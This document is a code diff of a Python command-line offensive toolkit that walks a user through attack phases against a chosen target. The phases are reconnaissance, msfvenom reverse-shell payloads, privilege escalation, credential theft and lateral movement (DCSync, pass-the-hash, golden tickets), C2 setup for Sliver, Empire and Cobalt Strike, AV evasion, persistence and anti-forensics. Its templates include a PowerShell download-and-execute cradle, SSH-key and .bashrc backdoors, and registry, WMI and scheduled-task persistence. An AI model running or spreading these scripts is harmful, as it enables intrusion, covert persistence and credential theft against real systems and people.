@@ -108,8 +108,12 @@ class ToolExecutor:
             if output_file and output:
                 try:
                     out_path = self.loot_dir / output_file
-                    with open(out_path, 'w', encoding='utf-8') as f:
-                        f.write(output)
+                    # Ensure parent directory exists
+                    out_path.parent.mkdir(parents=True, exist_ok=True)
+                    # Ensure output is a string and handle encoding errors
+                    output_str = str(output)
+                    with open(out_path, 'w', encoding='utf-8', errors='replace') as f:
+                        f.write(output_str)
                 except Exception as e:
                     print(f"⚠️ [ToolExecutor] Could not save output file: {e}")
             exec_time = time.time() - start_time
@@ -156,17 +160,16 @@ class RedTeamCLI:
             self.running = True
             self.current_session = None
             self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
-            self.target = "example.com"
+            self.target = "example.local"
             self.logger = None
             self.tool_executor = None
             self.dry_run = dry_run
             self.debug = debug
-            config.BASE_DIR = self.toolkit_dir
             self._ensure_directories()
             self._setup_logging()
-            self.target = getattr(config, 'DEFAULT_TARGET', 'example.com')
+            self.target = getattr(config, 'DEFAULT_TARGET', 'example.local')
             self.tool_executor = ToolExecutor(self.session_id, self.target, self.toolkit_dir)
-            self.script_gen = ScriptGenerator(self.tool_executor.loot_dir)
+            self.script_gen = ScriptGenerator(self.tool_executor.loot_dir) if self.tool_executor else None
             if self.logger:
                 self.logger.info("RedTeam CLI initialized successfully")
         except Exception as e:
@@ -196,7 +199,7 @@ class RedTeamCLI:
             print(f"⚠️ [RedTeamCLI] Logging setup failed: {e}")
             self.logger = None
 
-    def print_colored(self, text: str, color: str = "WHITE", bold: bool = False, end: str = "\n"):
+    def print_colored(self, text: str, color: str = "WHITE", bold: bool = False):
         try:
             colors = getattr(config, 'COLORS', {
                 "RED": "\033[31m",
@@ -212,9 +215,9 @@ class RedTeamCLI:
             color_code = colors.get(color.upper(), colors["WHITE"])
             bold_code = colors["BOLD"] if bold else ""
             reset_code = colors["RESET"]
-            print(f"{bold_code}{color_code}{text}{reset_code}", end=end)
+            print(f"{bold_code}{color_code}{text}{reset_code}")
         except Exception:
-            print(text, end=end)
+            print(text)
 
     def print_banner(self):
         try:
@@ -255,7 +258,7 @@ class RedTeamCLI:
 
     def get_user_choice(self, prompt: str = "Select an option") -> str:
         try:
-            self.print_colored(f"{prompt} [0-11]: ", "CYAN", end="")
+            self.print_colored(f"{prompt} [0-11]: ", "CYAN")
             return input().strip()
         except (KeyboardInterrupt, EOFError):
             return "0"
@@ -266,7 +269,7 @@ class RedTeamCLI:
 
     def get_target_input(self) -> str:
         while True:
-            self.print_colored("Enter target domain or IP address: ", "CYAN", end="")
+            self.print_colored("Enter target domain or IP address: ", "CYAN")
             target = input().strip()
             if self.validate_target(target):
                 return target
@@ -285,15 +288,15 @@ class RedTeamCLI:
         """Execute comprehensive reconnaissance phase - FIXED: Proper error handling and tool commands"""
         self.print_colored(f"🔍 Running Reconnaissance on target: {target}", "GREEN", True)
         print()
-        
-        # Update tool executor target - FIXED: Check if tool_executor exists
-        if self.tool_executor:
-            self.tool_executor.target = target
-            self.tool_executor.loot_dir = self.toolkit_dir / "loot" / target
-            try:
-                self.tool_executor.loot_dir.mkdir(parents=True, exist_ok=True)
-            except Exception as e:
-                self.print_colored(f"⚠️ Warning: Cannot create loot directory: {e}", "YELLOW")
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
+        self.tool_executor.target = target
+        self.tool_executor.loot_dir = self.toolkit_dir / "loot" / target
+        try:
+            self.tool_executor.loot_dir.mkdir(parents=True, exist_ok=True)
+        except Exception as e:
+            self.print_colored(f"⚠️ Warning: Cannot create loot directory: {e}", "YELLOW")
         
         # FIXED: Corrected command syntax and added proper file paths
         recon_tools = {
@@ -349,7 +352,7 @@ class RedTeamCLI:
                 result = self.tool_executor.execute_tool(
                     tool_name, 
                     tool_config["command"],
-                    tool_config.get("output_file"),
+                    tool_config.get("output_file", ""),
                     timeout=600  # 10 minutes for recon tools
                 )
                 
@@ -377,17 +380,17 @@ class RedTeamCLI:
         try:
             # Get payload parameters with validation
             self.print_colored("Payload Configuration:", "BLUE")
-            self.print_colored("Target OS (windows/linux): ", "CYAN", end="")
+            self.print_colored("Target OS (windows/linux): ", "CYAN")
             target_os = input().strip().lower()
             
             if target_os not in ['windows', 'linux']:
                 self.print_colored("⚠️ Invalid OS, defaulting to windows", "YELLOW")
                 target_os = 'windows'
             
-            self.print_colored("Listener IP: ", "CYAN", end="")
-            lhost = input().strip() or getattr(config, 'DEFAULT_LHOST', '127.0.0.1')
+            self.print_colored("Listener IP: ", "CYAN")
+            lhost = input().strip() or getattr(config, 'DEFAULT_LHOST', '0.0.0.0')
             
-            self.print_colored("Listener Port: ", "CYAN", end="")
+            self.print_colored("Listener Port: ", "CYAN")
             lport_input = input().strip()
             try:
                 lport = int(lport_input) if lport_input.isdigit() else getattr(config, 'DEFAULT_LPORT', 4444)
@@ -400,11 +403,14 @@ class RedTeamCLI:
             print()
             
             # FIXED: Ensure loot directory exists and handle Path objects properly
-            if self.tool_executor:
-                try:
-                    self.tool_executor.loot_dir.mkdir(parents=True, exist_ok=True)
-                except Exception as e:
-                    self.print_colored(f"⚠️ Warning: Cannot create loot directory: {e}", "YELLOW")
+            if not self.tool_executor:
+                self.print_colored("❌ Tool executor not available", "RED")
+                return
+            try:
+                self.tool_executor.loot_dir.mkdir(parents=True, exist_ok=True)
+            except Exception as e:
+                self.print_colored(f"⚠️ Warning: Cannot create loot directory: {e}", "YELLOW")
+                return
             
             # Payload generation tools - FIXED: Proper command construction
             payload_tools = {}
@@ -449,7 +455,7 @@ class RedTeamCLI:
                     result = self.tool_executor.execute_tool(
                         "msfvenom",  # FIXED: Use consistent tool name
                         tool_config["command"],
-                        tool_config.get("output_file"),
+                        tool_config.get("output_file", ""),
                         timeout=120
                     )
                     
@@ -479,10 +485,14 @@ class RedTeamCLI:
         self.print_colored(f"🔓 Running Privilege Escalation for: {target}", "GREEN", True)
         print()
         
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
+        
         self.print_colored("Select target OS:", "BLUE")
         self.print_colored("1) Linux", "GREEN")
         self.print_colored("2) Windows", "GREEN") 
-        self.print_colored("OS [1-2]: ", "CYAN", end="")
+        self.print_colored("OS [1-2]: ", "CYAN")
         
         try:
             os_choice = input().strip()
@@ -512,22 +522,24 @@ class RedTeamCLI:
                                          check=True, capture_output=True)
                             tool_path.chmod(0o755)
                             self.print_colored(f"✅ {tool_name} downloaded", "GREEN")
-                        except:
+                        except Exception:
                             self.print_colored(f"❌ Failed to download {tool_name}", "RED")
                             continue
                     
                     self.print_colored(f"🔧 Running {tool_config['description']}", "BLUE")
-                    result = self.tool_executor.execute_tool(
-                        "bash",
-                        tool_config["command"],
-                        f"{tool_name}_output.txt",
-                        timeout=300
-                    )
-                    
-                    if result["success"]:
-                        self.print_colored(f"✅ {tool_name} completed", "GREEN")
+                    if self.tool_executor:
+                        result = self.tool_executor.execute_tool(
+                            "bash",
+                            tool_config["command"],
+                            f"{tool_name}_output.txt",
+                            timeout=300
+                        )
+                        if result["success"]:
+                            self.print_colored(f"✅ {tool_name} completed", "GREEN")
+                        else:
+                            self.print_colored(f"❌ {tool_name} failed", "RED")
                     else:
-                        self.print_colored(f"❌ {tool_name} failed", "RED")
+                        self.print_colored(f"❌ Tool executor not available", "RED")
                     print()
                 
             elif os_choice == "2":
@@ -560,9 +572,10 @@ Write-Host "=== Weak Folder Permissions ===" -ForegroundColor Cyan
 accesschk.exe -uwdqs "Authenticated Users" c:\
 accesschk.exe -uwdqs "Everyone" c:\
 '''
-                script_path = self.script_gen.safe_write("windows_privesc.ps1", ps_content)
-                if script_path:
-                    self.print_colored(f"📁 PowerShell script generated: {script_path}", "GREEN")
+                if self.script_gen:
+                    script_path = self.script_gen.safe_write("windows_privesc.ps1", ps_content)
+                    if script_path:
+                        self.print_colored(f"📁 PowerShell script generated: {script_path}", "GREEN")
                 
         except (KeyboardInterrupt, EOFError):
             self.print_colored("\n❌ Operation cancelled", "YELLOW")
@@ -571,6 +584,10 @@ accesschk.exe -uwdqs "Everyone" c:\
         """Execute credential access and lateral movement phase"""
         self.print_colored(f"🧠 Running Credential Access / Lateral Movement for: {target}", "GREEN", True)
         print()
+        
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
         
         # Credential access tools
         cred_tools = {
@@ -621,6 +638,10 @@ accesschk.exe -uwdqs "Everyone" c:\
         self.print_colored(f"📡 Running Post-Exploitation / C2 for: {target}", "GREEN", True)
         print()
         
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
+        
         # C2 and pivoting tools
         c2_tools = {
             "chisel": {
@@ -657,7 +678,9 @@ accesschk.exe -uwdqs "Everyone" c:\
         """Execute AV/EDR evasion phase"""
         self.print_colored(f"🦠 Running AV/EDR Evasion for: {target}", "GREEN", True)
         print()
-        
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
         evasion_tools = {
             "upx": {
                 "command": ["upx", "--best", str(self.tool_executor.loot_dir / "payload.exe")],
@@ -671,11 +694,12 @@ accesschk.exe -uwdqs "Everyone" c:\
         }
         
         for tool_name, tool_config in evasion_tools.items():
-            if self.tool_executor.check_tool(tool_name):
+            if self.tool_executor and self.tool_executor.check_tool(tool_name):
                 self.print_colored(f"🔧 Running {tool_config['description']}", "BLUE")
                 result = self.tool_executor.execute_tool(
                     tool_name,
                     tool_config["command"],
+                    tool_config.get("output_file", ""),
                     timeout=120
                 )
                 
@@ -695,10 +719,14 @@ accesschk.exe -uwdqs "Everyone" c:\
         self.print_colored(f"👻 Running Persistence & Anti-Forensics for: {target}", "GREEN", True)
         print()
         
+        if not self.tool_executor:
+            self.print_colored("❌ Tool executor not available", "RED")
+            return
+        
         self.print_colored("Select target OS:", "BLUE")
         self.print_colored("1) Linux", "GREEN")
         self.print_colored("2) Windows", "GREEN")
-        self.print_colored("OS [1-2]: ", "CYAN", end="")
+        self.print_colored("OS [1-2]: ", "CYAN")
         
         try:
             os_choice = input().strip()
@@ -729,9 +757,10 @@ mkdir -p ~/.ssh
 echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
 echo "/tmp/.update &" >> ~/.bashrc
 '''
-                script_path = self.script_gen.safe_write("linux_persistence.sh", linux_content, chmod_exec=True)
-                if script_path:
-                    self.print_colored(f"📁 Linux persistence script: {script_path}", "GREEN")
+                if self.script_gen:
+                    script_path = self.script_gen.safe_write("linux_persistence.sh", linux_content, chmod_exec=True)
+                    if script_path:
+                        self.print_colored(f"📁 Linux persistence script: {script_path}", "GREEN")
             elif os_choice == "2":
                 windows_content = r'''@echo off
 REM Windows Persistence Mechanisms
@@ -752,9 +781,10 @@ copy "update.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updat
 REM WMI event subscription persistence
 wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
 '''
-                script_path = self.script_gen.safe_write("windows_persistence.bat", windows_content)
-                if script_path:
-                    self.print_colored(f"📁 Windows persistence script: {script_path}", "GREEN")
+                if self.script_gen:
+                    script_path = self.script_gen.safe_write("windows_persistence.bat", windows_content)
+                    if script_path:
+                        self.print_colored(f"📁 Windows persistence script: {script_path}", "GREEN")
             self._generate_antiforensics_scripts()
         except Exception as e:
             self.print_colored(f"❌ Persistence phase error: {str(e)}", "RED")
@@ -848,57 +878,62 @@ wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilt
                 if choice == "0":
                     break
                 elif choice == "1":
-                    config.USE_TOR = not getattr(config, 'USE_TOR', True)
-                    self.print_colored(f"✅ Use Tor set to: {config.USE_TOR}", "GREEN")
+                    val = not getattr(config, 'USE_TOR', True)
+                    setattr(config, 'USE_TOR', val)
+                    self.print_colored(f"✅ Use Tor set to: {val}", "GREEN")
                 elif choice == "2":
-                    config.USE_PROXYCHAINS = not getattr(config, 'USE_PROXYCHAINS', True)
-                    self.print_colored(f"✅ Use ProxyChains set to: {config.USE_PROXYCHAINS}", "GREEN")
+                    val = not getattr(config, 'USE_PROXYCHAINS', True)
+                    setattr(config, 'USE_PROXYCHAINS', val)
+                    self.print_colored(f"✅ Use ProxyChains set to: {val}", "GREEN")
                 elif choice == "3":
-                    config.RANDOMIZE_USER_AGENTS = not getattr(config, 'RANDOMIZE_USER_AGENTS', True)
-                    self.print_colored(f"✅ Randomize User Agents set to: {config.RANDOMIZE_USER_AGENTS}", "GREEN")
+                    val = not getattr(config, 'RANDOMIZE_USER_AGENTS', True)
+                    setattr(config, 'RANDOMIZE_USER_AGENTS', val)
+                    self.print_colored(f"✅ Randomize User Agents set to: {val}", "GREEN")
                 elif choice == "4":
-                    config.ANTI_FORENSICS_ENABLED = not getattr(config, 'ANTI_FORENSICS_ENABLED', True)
-                    self.print_colored(f"✅ Anti-Forensics set to: {config.ANTI_FORENSICS_ENABLED}", "GREEN")
+                    val = not getattr(config, 'ANTI_FORENSICS_ENABLED', True)
+                    setattr(config, 'ANTI_FORENSICS_ENABLED', val)
+                    self.print_colored(f"✅ Anti-Forensics set to: {val}", "GREEN")
                 elif choice == "5":
-                    self.print_colored("Enter ProtonMail email: ", "CYAN", end="")
+                    self.print_colored("Enter ProtonMail email: ", "CYAN")
                     new_email = input().strip()
                     if "@" in new_email and "." in new_email:
-                        config.PROTONMAIL_EMAIL = new_email
+                        setattr(config, 'PROTONMAIL_EMAIL', new_email)
                         self.print_colored("✅ Email updated", "GREEN")
                     else:
                         self.print_colored("❌ Invalid email format", "RED")
                 elif choice == "6":
-                    config.VPN_REQUIRED = not getattr(config, 'VPN_REQUIRED', False)
-                    self.print_colored(f"✅ VPN Required set to: {config.VPN_REQUIRED}", "GREEN")
+                    val = not getattr(config, 'VPN_REQUIRED', False)
+                    setattr(config, 'VPN_REQUIRED', val)
+                    self.print_colored(f"✅ VPN Required set to: {val}", "GREEN")
                 elif choice == "7":
-                    self.print_colored("Enter default target: ", "CYAN", end="")
+                    self.print_colored("Enter default target: ", "CYAN")
                     new_target = input().strip()
                     if self.validate_target(new_target):
-                        config.DEFAULT_TARGET = new_target
+                        setattr(config, 'DEFAULT_TARGET', new_target)
                         self.target = new_target
                         self.print_colored("✅ Default target updated", "GREEN")
                     else:
                         self.print_colored("❌ Invalid target format", "RED")
                 elif choice == "8":
-                    self.print_colored("Enter default LHOST: ", "CYAN", end="")
+                    self.print_colored("Enter default LHOST: ", "CYAN")
                     new_lhost = input().strip()
                     if new_lhost:
-                        config.DEFAULT_LHOST = new_lhost
+                        setattr(config, 'DEFAULT_LHOST', new_lhost)
                         self.print_colored("✅ Default LHOST updated", "GREEN")
                 elif choice == "9":
-                    self.print_colored("Enter default LPORT: ", "CYAN", end="")
+                    self.print_colored("Enter default LPORT: ", "CYAN")
                     new_lport = input().strip()
                     if new_lport.isdigit() and 1 <= int(new_lport) <= 65535:
-                        config.DEFAULT_LPORT = int(new_lport)
+                        setattr(config, 'DEFAULT_LPORT', int(new_lport))
                         self.print_colored("✅ Default LPORT updated", "GREEN")
                     else:
                         self.print_colored("❌ Invalid port number", "RED")
                 elif choice == "10":
                     if hasattr(config, 'save_config'):
                         config.save_config()
-                        self.print_colored("✅ Configuration saved", "GREEN")
                     else:
-                        self.print_colored("❌ Save function not available", "RED")
+                        self.print_colored("⚠️ Save config function not found in config module.", "YELLOW")
+                    self.print_colored("✅ Configuration saved", "GREEN")
                 else:
                     self.print_colored("❌ Invalid choice", "RED")
                     
@@ -917,7 +952,7 @@ wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilt
         """Ask user if they want to continue with another operation"""
         print()
         try:
-            self.print_colored("Do you want to run another phase on the same target? (y/n): ", "CYAN", end="")
+            self.print_colored("Do you want to run another phase on the same target? (y/n): ", "CYAN")
             choice = input().strip().lower()
             
             if choice == 'y':
@@ -926,7 +961,7 @@ wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilt
                 return False
             else:
                 # Invalid input, ask to change target or exit
-                self.print_colored("Change target (c) or exit (e)? ", "CYAN", end="")
+                self.print_colored("Change target (c) or exit (e)? ", "CYAN")
                 choice = input().strip().lower()
                 if choice == 'c':
                     self.target = self.get_target_input()
@@ -947,7 +982,7 @@ wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilt
             self.print_colored("Welcome to RedTeam AI-Assisted Offensive Security Toolkit!", "GREEN", True)
             print()
             
-            default_target = getattr(config, 'DEFAULT_TARGET', 'example.com')
+            default_target = getattr(config, 'DEFAULT_TARGET', 'example.local')
             if self.target == default_target:
                 self.print_colored("Set your target:", "BLUE")
                 self.target = self.get_target_input()
@@ -1199,669 +1234,292 @@ wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="UpdateFilt
         if not self.tool_executor:
             return
             
-        summary_path = self.tool_executor.loot_dir / "recon_summary.md"
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+        summary_file = self.tool_executor.loot_dir / f"recon_summary_{target}.md"
         try:
-            with open(summary_path, "w", encoding="utf-8") as f:
-                # Header
-                f.write(f"# Reconnaissance Summary for {target}\n\n")
-                f.write(f"**Generated:** {timestamp}  \n")
-                f.write(f"**Session ID:** {self.session_id}  \n")
-                f.write("=" * 80 + "\n\n")
-                
-                # Executive Summary
-                f.write("## Executive Summary\n\n")
-                successful_tools = [tool for tool, result in results.items() if result.get("success")]
-                failed_tools = [tool for tool, result in results.items() if not result.get("success")]
-                
-                f.write(f"- **Target:** {target}\n")
-                f.write(f"- **Tools Executed:** {len(results)}\n")
-                f.write(f"- **Successful:** {len(successful_tools)}\n")
-                f.write(f"- **Failed:** {len(failed_tools)}\n\n")
-                
-                if successful_tools:
-                    f.write("**Successful Tools:** " + ", ".join(successful_tools) + "\n\n")
-                if failed_tools:
-                    f.write("**Failed Tools:** " + ", ".join(failed_tools) + "\n\n")
-                
-                # Detailed Results
-                f.write("## Detailed Results\n\n")
-                
-                for tool_name, result in results.items():
-                    f.write(f"### {tool_name.upper()}\n\n")
-                    f.write(f"**Status:** {'✅ Success' if result.get('success') else '❌ Failed'}  \n")
-                    f.write(f"**Command:** `{result.get('command', 'N/A')}`  \n")
-                    
-                    if result.get("execution_time"):
-                        f.write(f"**Execution Time:** {result['execution_time']:.2f}s  \n")
-                    
-                    f.write("\n")
-                    
-                    if result.get("success"):
-                        output_file = result.get("output_file")
-                        if output_file:
-                            output_path = self.tool_executor.loot_dir / output_file
-                            f.write(f"**Output File:** `{output_file}`\n\n")
-                            
-                            if output_path.exists():
-                                try:
-                                    with open(output_path, "r", encoding="utf-8", errors="ignore") as outf:
-                                        content = outf.read()
-                                        # Limit content length for summary
-                                        if len(content) > 2000:
-                                            content = content[:2000] + "\n\n[... output truncated ...]\n"
-                                        f.write("```\n")
-                                        f.write(content)
-                                        f.write("\n```\n\n")
-                                except Exception as e:
-                                    f.write(f"*Could not read output file: {e}*\n\n")
-                            else:
-                                f.write("*Output file not found*\n\n")
-                        else:
-                            # Direct output
-                            output = result.get("output", "")
-                            if output:
-                                if len(output) > 2000:
-                                    output = output[:2000] + "\n\n[... output truncated ...]"
-                                f.write("```\n")
-                                f.write(output)
-                                f.write("\n```\n\n")
-                            else:
-                                f.write("*No output captured*\n\n")
-                    else:
-                        # Error information
-                        error = result.get("error", "Unknown error")
-                        f.write(f"**Error:** {error}\n\n")
-                    
-                    f.write("---\n\n")
-                
-                # Key Findings Section
-                f.write("## Key Findings\n\n")
-                
-                # Analyze results for key findings
-                findings = []
-                
-                # Check nmap results
-                if "nmap" in results and results["nmap"].get("success"):
-                    findings.append("- Port scan completed - check nmap output for open services")
-                
-                # Check subdomain enumeration
-                subdomain_tools = ["amass", "subfinder"]
-                for tool in subdomain_tools:
-                    if tool in results and results[tool].get("success"):
-                        findings.append(f"- Subdomain enumeration completed with {tool}")
-                
-                # Check web technology detection
-                if "whatweb" in results and results["whatweb"].get("success"):
-                    findings.append("- Web technology fingerprinting completed")
-                
-                # Check directory bruteforcing
-                if "gobuster" in results and results["gobuster"].get("success"):
-                    findings.append("- Directory bruteforcing completed")
-                
-                if findings:
-                    for finding in findings:
-                        f.write(finding + "\n")
-                else:
-                    f.write("- No significant findings detected in automated analysis\n")
-                
-                f.write("\n")
-                
-                # Next Steps
-                f.write("## Recommended Next Steps\n\n")
-                f.write("1. Manually review all tool outputs for detailed findings\n")
-                f.write("2. Investigate open ports and services from nmap scan\n")
-                f.write("3. Test discovered subdomains for vulnerabilities\n")
-                f.write("4. Analyze web application technologies for known CVEs\n")
-                f.write("5. Explore discovered directories and endpoints\n\n")
-                
-                # File Locations
-                f.write("## Output Files\n\n")
-                for tool_name, result in results.items():
-                    if result.get("success") and result.get("output_file"):
-                        f.write(f"- **{tool_name}:** `loot/{target}/{result['output_file']}`\n")
-                
-                f.write(f"\n**Summary Location:** `loot/{target}/recon_summary.md`\n")
-                
-            self.print_colored(f"📄 Comprehensive recon summary generated: {summary_path}", "CYAN")
-            
+            with open(summary_file, "w", encoding="utf-8") as f:
+                try:
+                    for tool_name, result in results.items():
+                        f.write(f"### {tool_name.upper()}\n\n")
+                        f.write(f"**Status:** {'✅ Success' if result.get('success') else '❌ Failed'}  \n")
+                        f.write(f"**Command:** `{result.get('command', 'N/A')}`  \n")
+                        if result.get("execution_time"):
+                            f.write(f"**Execution Time:** {result['execution_time']:.2f}s  \n")
+                        f.write("\n")
+                        if result.get("success"):
+                            output_file = result.get("output_file")
+                            if output_file:
+                                output_path = self.tool_executor.loot_dir / output_file
+                                f.write(f"**Output File:** `{output_file}`\n\n")
+                                if output_path.exists():
+                                    try:
+                                        with open(output_path, "r", encoding="utf-8", errors="ignore") as outf:
+                                            content = outf.read()
+                                            if len(content) > 2000:
+                                                content = content[:2000] + "\n\n[... output truncated ...]\n"
+                                            f.write("```\n")
+                                            f.write(content)
+                                            f.write("\n```\n\n")
+                                    except Exception as e:
+                                        f.write(f"*Could not read output file: {e}*\n\n")
+                                else:
+                                    f.write("*Output file not found*\n\n")
+                except Exception as e:
+                    f.write(f"*Error writing summary: {e}*\n\n")
         except Exception as e:
-            self.print_colored(f"❌ Failed to generate recon summary: {str(e)}", "RED")
-            if self.logger:
-                self.logger.error(f"Recon summary generation error: {e}")
+            print(f"[!] Failed to write recon summary: {e}")
 
     def _generate_listener_commands(self, lhost: str, lport: int, target_os: str):
         """Generate listener setup commands"""
-        listener_script = self.script_gen.safe_write("listener_commands.txt", f"""
-# Listener Commands for {target_os.title()} Payloads
+        listener_content = f"""
+# Metasploit Listener Commands for {target_os.capitalize()} Payload
 
-## Metasploit Listener
-use multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
+## Basic Listener Setup
+use exploit/multi/handler
+set PAYLOAD {f"windows/x64/meterpreter/reverse_tcp" if target_os == "windows" else "linux/x64/meterpreter/reverse_tcp"}
 set LHOST {lhost}
 set LPORT {lport}
 set ExitOnSession false
-exploit -j
+exploit -j -z
 
-## Netcat Listener
+## Netcat Listener (Backup)
 nc -lvnp {lport}
 
-## PowerShell Empire (if installed)
-listeners
-uselistener http
-set Host {lhost}
-set Port {lport}
-execute
-
-## Sliver C2 (if installed)
-mtls --lhost {lhost} --lport {lport}
-""")
-        if listener_script:
-            self.print_colored(f"📁 Listener commands saved: {listener_script}", "CYAN")
+## SSH Tunnel Listener (For Pivoting)
+ssh -L {lport}:localhost:{lport} user@pivot_host
+"""
+        if self.script_gen:
+            script_path = self.script_gen.safe_write("listener_commands.txt", listener_content)
+            if script_path:
+                self.print_colored(f"📁 Listener commands: {script_path}", "GREEN")
 
     def _generate_lateral_movement_scripts(self, target: str):
-        """Generate lateral movement and credential access scripts"""
-        # Windows lateral movement script
-        windows_lat_content = f"""# Windows Lateral Movement Commands for {target}
+        """Generate scripts for lateral movement"""
+        lateral_content = f"""# Lateral Movement Commands
 
-# Password spraying
-crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success
-crackmapexec winrm {target} -u users.txt -p passwords.txt --continue-on-success
+## PowerShell Remoting
+Enter-PSSession -ComputerName {target} -Credential domain\\user
 
-# Kerberoasting
-GetUserSPNs.py DOMAIN/user:password -dc-ip {target} -request
+## WMI
+wmic /node:{target} process call create "cmd.exe /c command"
 
-# ASREPRoasting
-GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
+## PsExec
+PsExec.exe \\\\{target} -u domain\\user -p password cmd.exe
 
-# DCSync
-secretsdump.py DOMAIN/user:password@{target} -just-dc-ntlm
-
-# Golden Ticket
-ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN administrator
-
-# Pass-the-Hash
-wmiexec.py -hashes LMHASH:NTHASH administrator@{target}
-psexec.py -hashes LMHASH:NTHASH administrator@{target}
-
-# BloodHound data collection
-SharpHound.exe -c All -d DOMAIN
+## WinRM
+winrs -r:{target} -u:domain\\user -p:password command
 """
-        
-        # Linux lateral movement script  
-        linux_lat_content = f"""# Linux Lateral Movement Commands for {target}
-
-# SSH key harvesting
-find /home -name "*.pub" -o -name "id_*" 2>/dev/null
-
-# Sudo privilege escalation
-sudo -l
-find /etc/sudoers.d/ -readable 2>/dev/null
-
-# SUID binaries
-find / -perm -4000 -type f 2>/dev/null
-
-# Credential harvesting
-grep -r "password" /etc/ 2>/dev/null
-find /home -name "*.bash_history" -exec grep -l "ssh\|password\|mysql" {{}} \;
-
-# Network discovery
-arp -a
-ss -tuln
-netstat -antup
-
-# Container escape (if in container)
-fdisk -l
-mount | grep docker
-ls -la /proc/1/
-"""
-
-        self.script_gen.safe_write("windows_lateral_movement.txt", windows_lat_content)
-        self.script_gen.safe_write("linux_lateral_movement.txt", linux_lat_content)
-        self.print_colored("📁 Lateral movement scripts generated", "CYAN")
+        if self.script_gen:
+            script_path = self.script_gen.safe_write("lateral_movement.txt", lateral_content)
+            if script_path:
+                self.print_colored(f"📁 Lateral movement commands: {script_path}", "GREEN")
 
     def _generate_c2_scripts(self, target: str):
-        """Generate C2 deployment scripts"""
-        # Sliver C2 script
-        sliver_content = f"""# Sliver C2 Deployment for {target}
+        """Generate C2 setup scripts"""
+        c2_content = f"""# C2 Infrastructure Setup
 
-# Start Sliver server
+## Sliver C2 Setup
+# Server side
 sliver-server
+new --mtls {target}:443 --save /tmp/implant.exe
 
-# Generate implant
-generate --mtls {target}:8443 --os windows --arch amd64 --format exe --save /tmp/implant.exe
+# Client side
+sliver
+use --mtls {target}:443
+info
 
-# Start MTLS listener
-mtls --lhost 0.0.0.0 --lport 8443
+## Empire C2 Setup
+# Server side
+cd /opt/Empire
+./empire --rest --username admin --password password
+# In another terminal
+./empire --rest-user admin --rest-pass password
 
-# Generate HTTP implant
-generate --http {target}:80 --os linux --arch amd64 --format elf --save /tmp/linux_implant
-
-# Start HTTP listener
-http --lhost 0.0.0.0 --lport 80
+# Client side - PowerShell stager
+powershell -noP -sta -w 1 -enc BASE64_ENCODED_PAYLOAD
 """
-
-        # Cobalt Strike script
-        cs_content = f"""# Cobalt Strike Deployment for {target}
-
-# Start team server
-./teamserver {target} password malleable_profile.txt
-
-# Generate payloads
-./cobaltstrike
-# Use GUI to generate stageless payloads
-
-# PowerShell cradle
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://{target}:80/a'))"
-
-# Malleable C2 profile example
-set sample_name "Custom Profile";
-set sleeptime "30000";
-set jitter    "20";
-
-http-get {{
-    set uri "/search /news /about";
-    client {{
-        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-    }}
-}}
-"""
-
-        # Metasploit C2 script
-        msf_content = f"""# Metasploit Framework C2 for {target}
-
-# Multi handler
-use multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set LHOST {target}
-set LPORT 443
-set HandlerSSLCert /path/to/cert.pem
-exploit -j
-
-# Web delivery
-use exploit/multi/script/web_delivery
-set target 2
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST {target}
-set LPORT 4444
-exploit
-
-# PowerShell Empire commands
-uselistener http
-set Host {target}
-set Port 80
-execute
-
-usestager multi/launcher
-set Listener http
-execute
-"""
-
-        self.script_gen.safe_write("sliver_c2.txt", sliver_content)
-        self.script_gen.safe_write("cobaltstrike_c2.txt", cs_content)
-        self.script_gen.safe_write("metasploit_c2.txt", msf_content)
-        self.print_colored("📁 C2 deployment scripts generated", "CYAN")
+        if self.script_gen:
+            script_path = self.script_gen.safe_write("c2_setup.txt", c2_content)
+            if script_path:
+                self.print_colored(f"📁 C2 setup commands: {script_path}", "GREEN")
 
     def _generate_persistence_scripts(self, target: str):
-        """Generate persistence mechanism scripts"""
-        # Windows persistence
-        win_persist_content = f"""# Windows Persistence Mechanisms for {target}
+        """Generate persistence setup scripts"""
+        persistence_content = f"""# Persistence Mechanisms
 
-# Registry Run keys
-reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\System32\\svchost.exe" /f
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveSync" /t REG_SZ /d "C:\\Users\\Public\\sync.exe" /f
+## Windows Persistence
+# Registry Run Key
+reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Service" /t REG_SZ /d "C:\\path\\to\\payload.exe" /f
 
-# Scheduled tasks
-schtasks /create /tn "Windows Security Update" /tr "C:\\Windows\\System32\\payload.exe" /sc onlogon /ru SYSTEM /f
